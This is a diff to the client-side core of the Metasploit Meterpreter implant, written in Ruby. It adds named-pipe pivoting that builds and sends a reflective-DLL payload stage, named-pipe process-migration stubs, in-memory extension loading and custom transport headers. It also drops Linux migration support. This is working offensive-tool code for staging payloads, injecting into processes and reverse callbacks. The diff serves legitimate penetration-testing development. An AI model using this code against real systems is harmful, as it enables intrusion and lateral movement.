@@ -3,6 +3,7 @@
 require 'rex/post/meterpreter/packet'
 require 'rex/post/meterpreter/extension'
 require 'rex/post/meterpreter/client'
+require 'msf/core/payload/transport_config'
 
 # Used to generate a reflective DLL when migrating. This is yet another
 # argument for moving the meterpreter client into the Msf namespace.
@@ -33,23 +34,15 @@ module Meterpreter
 ###
 class ClientCore < Extension
 
-  UNIX_PATH_MAX = 108
-  DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"
-
-  METERPRETER_TRANSPORT_SSL   = 0
+  METERPRETER_TRANSPORT_TCP   = 0
   METERPRETER_TRANSPORT_HTTP  = 1
   METERPRETER_TRANSPORT_HTTPS = 2
 
-  TIMEOUT_SESSION = 24*3600*7  # 1 week
-  TIMEOUT_COMMS = 300          # 5 minutes
-  TIMEOUT_RETRY_TOTAL = 60*60  # 1 hour
-  TIMEOUT_RETRY_WAIT = 10      # 10 seconds
-
   VALID_TRANSPORTS = {
-    'reverse_tcp'   => METERPRETER_TRANSPORT_SSL,
-    'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
-    'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
-    'bind_tcp'      => METERPRETER_TRANSPORT_SSL
+      'reverse_tcp'   => METERPRETER_TRANSPORT_TCP,
+      'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
+      'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
+      'bind_tcp'      => METERPRETER_TRANSPORT_TCP
   }
 
   include Rex::Payloads::Meterpreter::UriChecksum
@@ -66,6 +59,44 @@ class ClientCore < Extension
   # Core commands
   #
   ##
+
+  #
+  # create a named pipe pivot
+  #
+  def create_named_pipe_pivot(opts)
+    request = Packet.create_request('core_pivot_add')
+    request.add_tlv(TLV_TYPE_PIVOT_NAMED_PIPE_NAME, opts[:pipe_name])
+
+
+    c = Class.new(::Msf::Payload)
+    c.include(::Msf::Payload::Stager)
+    c.include(::Msf::Payload::TransportConfig)
+
+    # Include the appropriate reflective dll injection module for the target process architecture...
+    if opts[:arch] == ARCH_X86
+      c.include(::Msf::Payload::Windows::MeterpreterLoader)
+    elsif opts[:arch] == ARCH_X64
+      c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
+    end
+
+    stage_opts = {
+      force_write_handle: true,
+      datastore: {
+        'PIPEHOST' => opts[:pipe_host],
+        'PIPENAME' => opts[:pipe_name]
+      }
+    }
+
+    stager = c.new()
+
+    stage_opts[:transport_config] = [stager.transport_config_reverse_named_pipe(stage_opts)]
+    stage = stager.stage_payload(stage_opts)
+
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA, stage)
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA_SIZE, stage.length)
+
+    response = self.client.send_request(request)
+  end
 
   #
   # Get a list of loaded commands for the given extension.
@@ -112,15 +143,16 @@ class ClientCore < Extension
 
     response.each(TLV_TYPE_TRANS_GROUP) { |t|
       result[:transports] << {
-        :url          => t.get_tlv_value(TLV_TYPE_TRANS_URL),
-        :comm_timeout => t.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
-        :retry_total  => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
-        :retry_wait   => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT),
-        :ua           => t.get_tlv_value(TLV_TYPE_TRANS_UA),
-        :proxy_host   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_HOST),
-        :proxy_user   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_USER),
-        :proxy_pass   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_PASS),
-        :cert_hash    => t.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH)
+        :url            => t.get_tlv_value(TLV_TYPE_TRANS_URL),
+        :comm_timeout   => t.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
+        :retry_total    => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
+        :retry_wait     => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT),
+        :ua             => t.get_tlv_value(TLV_TYPE_TRANS_UA),
+        :proxy_host     => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_HOST),
+        :proxy_user     => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_USER),
+        :proxy_pass     => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_PASS),
+        :cert_hash      => t.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH),
+        :custom_headers => t.get_tlv_value(TLV_TYPE_TRANS_HEADERS)
       }
     }
 
@@ -167,6 +199,10 @@ class ClientCore < Extension
   #	LibraryFilePath
   #		The path to the library that is to be loaded
   #
+  #	LibraryFileImage
+  #		Binary object containing the library to be loaded
+  #		(can be used instead of LibraryFilePath)
+  #
   #	TargetFilePath
   #		The target library path when uploading
   #
@@ -182,12 +218,13 @@ class ClientCore < Extension
   #
   def load_library(opts)
     library_path = opts['LibraryFilePath']
+    library_image = opts['LibraryFileImage']
     target_path  = opts['TargetFilePath']
     load_flags   = LOAD_LIBRARY_FLAG_LOCAL
 
     # No library path, no cookie.
-    if library_path.nil?
-      raise ArgumentError, 'No library file path was supplied', caller
+    if library_path.nil? && library_image.nil?
+      raise ArgumentError, 'No library file path or image was supplied', caller
     end
 
     # Set up the proper loading flags
@@ -206,14 +243,17 @@ class ClientCore < Extension
 
     # If we must upload the library, do so now
     if (load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL
-      image = ''
+      if library_image.nil?
+        # Caller did not provide the image, load it from the path
+        library_image = ''
 
-      ::File.open(library_path, 'rb') { |f|
-        image = f.read
-      }
+        ::File.open(library_path, 'rb') { |f|
+          library_image = f.read
+        }
+      end
 
-      if image
-        request.add_tlv(TLV_TYPE_DATA, image, false, client.capabilities[:zlib])
+      if library_image
+        request.add_tlv(TLV_TYPE_DATA, library_image, false, client.capabilities[:zlib])
       else
         raise RuntimeError, "Failed to serialize library #{library_path}.", caller
       end
@@ -222,8 +262,17 @@ class ClientCore < Extension
       # path of the local and target so that it gets loaded with a random
       # name
       if opts['Extension']
-        library_path = "ext#{rand(1000000)}.#{client.binary_suffix}"
-        target_path  = library_path
+        if client.binary_suffix and client.binary_suffix.size > 1
+          m = /(.*)\.(.*)/.match(library_path)
+          suffix = $2
+        elsif client.binary_suffix.size == 1
+          suffix = client.binary_suffix[0]
+        else
+          suffix = client.binary_suffix
+        end
+
+        library_path = "ext#{rand(1000000)}.#{suffix}"
+        target_path  = "/tmp/#{library_path}"
       end
     end
 
@@ -269,6 +318,22 @@ class ClientCore < Extension
       raise RuntimeError, "No modules were specified", caller
     end
 
+    modnameprovided = mod
+    suffix = nil
+    if not client.binary_suffix
+      suffix = ''
+    elsif client.binary_suffix.size > 1
+      client.binary_suffix.each { |s|
+        if (mod =~ /(.*)\.#{s}/ )
+          mod = $1
+          suffix = s
+          break
+        end
+      }
+    else
+      suffix = client.binary_suffix.first
+    end
+
     # Query the remote instance to see if commands for the extension are
     # already loaded
     commands = get_loaded_extension_commands(mod.downcase)
@@ -276,22 +341,31 @@ class ClientCore < Extension
     # if there are existing commands for the given extension, then we can use
     # what's already there
     unless commands.length > 0
-      # Get us to the installation root and then into data/meterpreter, where
-      # the file is expected to be
-      modname = "ext_server_#{mod.downcase}"
-      path = MetasploitPayloads.meterpreter_path(modname, client.binary_suffix)
+      image = nil
+      path = nil
+      # If client.sys isn't setup, it's a Windows meterpreter 
+      if client.respond_to?(:sys) && !client.sys.config.sysinfo['BuildTuple'].blank?
+        # Query the payload gem directly for the extension image
+        image = MetasploitPayloads::Mettle.load_extension(client.sys.config.sysinfo['BuildTuple'], mod.downcase, suffix)
+      else
+        # Get us to the installation root and then into data/meterpreter, where
+        # the file is expected to be
+        modname = "ext_server_#{mod.downcase}"
+        path = MetasploitPayloads.meterpreter_path(modname, suffix)
 
-      if opts['ExtensionPath']
-        path = ::File.expand_path(opts['ExtensionPath'])
+        if opts['ExtensionPath']
+          path = ::File.expand_path(opts['ExtensionPath'])
+        end
       end
 
-      if path.nil?
-        raise RuntimeError, "No module of the name #{modname}.#{client.binary_suffix} found", caller
+      if path.nil? and image.nil?
+        raise RuntimeError, "No module of the name #{modnameprovided} found", caller
       end
 
       # Load the extension DLL
       commands = load_library(
           'LibraryFilePath' => path,
+          'LibraryFileImage' => image,
           'UploadLibrary'   => true,
           'Extension'       => true,
           'SaveToDisk'      => opts['LoadFromDisk'])
@@ -320,7 +394,7 @@ class ClientCore < Extension
   #
   def set_session_guid(guid)
     request = Packet.create_request('core_set_session_guid')
-    request.add_tlv(TLV_TYPE_SESSION_GUID, [guid.gsub(/-/, '')].pack('H*'))
+    request.add_tlv(TLV_TYPE_SESSION_GUID, guid)
 
     client.send_request(request)
 
@@ -338,10 +412,7 @@ class ClientCore < Extension
 
     response = client.send_request(*args)
 
-    bytes = response.get_tlv_value(TLV_TYPE_SESSION_GUID)
-
-    parts = bytes.unpack('H*')[0]
-    [parts[0, 8], parts[8, 4], parts[12, 4], parts[16, 4], parts[20, 12]].join('-')
+    response.get_tlv_value(TLV_TYPE_SESSION_GUID)
   end
 
   #
@@ -531,6 +602,7 @@ class ClientCore < Extension
     # We cannot migrate into a process that we are unable to open
     # On linux, arch is empty even if we can access the process
     if client.platform == 'windows'
+
       if target_process['arch'] == nil || target_process['arch'].empty?
         raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
       end
@@ -541,51 +613,17 @@ class ClientCore < Extension
       raise RuntimeError, 'Cannot migrate into current process', caller
     end
 
-    if client.platform == 'linux'
-      if writable_dir.to_s.strip.empty?
-        writable_dir = tmp_folder
-      end
-
-      stat_dir = client.fs.filestat.new(writable_dir)
-
-      unless stat_dir.directory?
-        raise RuntimeError, "Directory #{writable_dir} not found", caller
-      end
-      # Rex::Post::FileStat#writable? isn't available
-    end
-
     migrate_stub = generate_migrate_stub(target_process)
     migrate_payload = generate_migrate_payload(target_process)
 
     # Build the migration request
     request = Packet.create_request('core_migrate')
 
-    if client.platform == 'linux'
-      socket_path = File.join(writable_dir, Rex::Text.rand_text_alpha_lower(5 + rand(5)))
-
-      if socket_path.length > UNIX_PATH_MAX - 1
-        raise RuntimeError, 'The writable dir is too long', caller
-      end
-
-      pos = migrate_payload.index(DEFAULT_SOCK_PATH)
-
-      if pos.nil?
-        raise RuntimeError, 'The meterpreter binary is wrong', caller
-      end
-
-      migrate_payload[pos, socket_path.length + 1] = socket_path + "\x00"
-
-      ep = elf_ep(migrate_payload)
-      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
-      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
-      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
-    end
-
-    request.add_tlv( TLV_TYPE_MIGRATE_PID, target_pid )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
 
     if target_process['arch'] == ARCH_X64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
@@ -614,7 +652,7 @@ class ClientCore < Extension
       # Sleep for 5 seconds to allow the full handoff, this prevents
       # the original process from stealing our loadlib requests
       ::IO.select(nil, nil, nil, 5.0)
-    else
+    elsif client.pivot_session.nil?
       # Prevent new commands from being sent while we finish migrating
       client.comm_mutex.synchronize do
         # Disable the socket request monitor
@@ -686,11 +724,8 @@ class ClientCore < Extension
   # Indicates if the given transport is a valid transport option.
   #
   def valid_transport?(transport)
-    if transport
-      VALID_TRANSPORTS.has_key?(transport.downcase)
-    else
-      false
-    end
+    return false if transport.nil?
+    VALID_TRANSPORTS.has_key?(transport.downcase)
   end
 
   #
@@ -731,7 +766,8 @@ private
   # Get a reference to the currently active transport.
   #
   def get_current_transport
-    transport_list[:transports][0]
+    x = transport_list
+    x[:transports][0]
   end
 
   #
@@ -740,6 +776,7 @@ private
   #
   def generate_migrate_stub(target_process)
     stub = nil
+
 
     if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
       t = get_current_transport
@@ -751,6 +788,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp)
@@ -760,6 +799,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp_x64)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe_x64)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp_x64)
@@ -790,11 +831,11 @@ private
       opts[:lhost] = nil
     end
 
-    transport = VALID_TRANSPORTS[opts[:transport]]
+    transport = opts[:transport].downcase
 
     request = Packet.create_request(method)
 
-    scheme = opts[:transport].split('_')[1]
+    scheme = transport.split('_')[1]
     url = "#{scheme}://#{opts[:lhost]}:#{opts[:lport]}"
 
     if opts[:luri] && opts[:luri].length > 0
@@ -824,7 +865,7 @@ private
     end
 
     # do more magic work for http(s) payloads
-    unless opts[:transport].ends_with?('tcp')
+    unless transport.ends_with?('tcp')
       if opts[:uri]
         url << '/' unless opts[:uri].start_with?('/')
         url << opts[:uri]
@@ -838,7 +879,7 @@ private
       opts[:ua] ||= 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'
       request.add_tlv(TLV_TYPE_TRANS_UA, opts[:ua])
 
-      if transport == METERPRETER_TRANSPORT_HTTPS && opts[:cert]
+      if transport == 'reverse_https' && opts[:cert] # currently only https transport offers ssl
         hash = Rex::Socket::X509Certificate.get_cert_file_hash(opts[:cert])
         request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)
       end
@@ -859,27 +900,10 @@ private
 
     end
 
-    request.add_tlv(TLV_TYPE_TRANS_TYPE, transport)
+    request.add_tlv(TLV_TYPE_TRANS_TYPE, VALID_TRANSPORTS[transport])
     request.add_tlv(TLV_TYPE_TRANS_URL, url)
 
-    return request
-  end
-
-
-  #
-  # Create a full migration payload specific to the target process.
-  #
-  def generate_migrate_payload(target_process)
-    case client.platform
-    when 'windows'
-      blob = generate_migrate_windows_payload(target_process)
-    when 'linux'
-      blob = generate_migrate_linux_payload
-    else
-      raise RuntimeError, "Unsupported platform '#{client.platform}'"
-    end
-
-    blob
+    request
   end
 
   #
@@ -905,34 +929,18 @@ private
   end
 
   #
-  # Create a full Linux-specific migration payload specific to the target process.
+  # Create a full migration payload specific to the target process.
   #
-  def generate_migrate_linux_payload
-    MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
-  end
-
-  #
-  # Determine the elf entry poitn for the given payload.
-  #
-  def elf_ep(payload)
-    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
-    ep = elf.elf_header.e_entry
-    return ep
-  end
-
-  #
-  # Get the tmp folder for the session.
-  #
-  def tmp_folder
-    tmp = client.sys.config.getenv('TMPDIR')
-
-    if tmp.to_s.strip.empty?
-      tmp = '/tmp'
+  def generate_migrate_payload(target_process)
+    case client.platform
+    when 'windows'
+      blob = generate_migrate_windows_payload(target_process)
+    else
+      raise RuntimeError, "Unsupported platform '#{client.platform}'"
     end
 
-    tmp
+    blob
   end
-
 end
 
 end; end; end
